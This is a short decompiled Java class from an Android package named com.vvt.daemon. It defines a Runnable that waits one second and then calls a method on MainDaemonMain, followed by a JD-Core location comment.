package com.vvt.daemon;

import android.os.SystemClock;

class f
  implements Runnable
{
  f(MainDaemonMain paramMainDaemonMain) {}
  
  public void run()
  {
    SystemClock.sleep(1000L);
    MainDaemonMain.e(this.a);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */